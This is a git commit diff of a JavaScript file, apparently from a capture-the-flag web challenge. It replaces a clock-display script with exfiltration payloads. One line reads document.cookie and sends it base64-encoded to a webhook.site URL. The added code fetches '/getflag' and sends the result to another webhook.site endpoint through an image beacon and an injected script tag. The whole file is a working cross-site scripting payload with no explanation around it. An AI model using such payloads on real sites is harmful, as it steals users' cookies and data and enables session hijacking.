fb36f05a9db3e7e5e7bc1246c6bb09703f0ba88e
Guan-Yu-Chen <155933115+Guan-Yu-Chen@users.noreply.github.com>
2025-04-25 10:51:23 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,16 +1,19 @@
 var cookie = document.cookie;
 fetch("https://webhook.site/8bfc556c-6584-4e6e-8a23-980d42dc97c0?"+window.btoa(cookie));
-alert(6);
-document.addEventListener("DOMContentLoaded", function () {
-  const button = document.getElementById("showTimeButton");
-  button.addEventListener("click", function () {
-    alert();
+
+fetch("/getflag")
+  .then(res => res.text())
+  .then(flag => {
+    // 用 image 方式外傳資料
+    new Image().src = "https://webhook.site/8b729a46-da4b-4b79-b5a5-9b6d53bac06d?" + btoa(flag);
   });
 
-  function displayCurrentTime() {
-    const now = new Date();
-    const timeString = now.toLocaleTimeString();
-    document.getElementById("timeDisplay").innerText =
-      "現在時間: " + timeString;
-  }
-});
+fetch("/getflag")
+  .then(res => res.text())
+  .then(flag => {
+    let s = document.createElement('script');
+    s.src = "https://webhook.site/8b729a46-da4b-4b79-b5a5-9b6d53bac06d?" + btoa(flag);
+    document.body.appendChild(s);
+  });
+
+alert(7777);
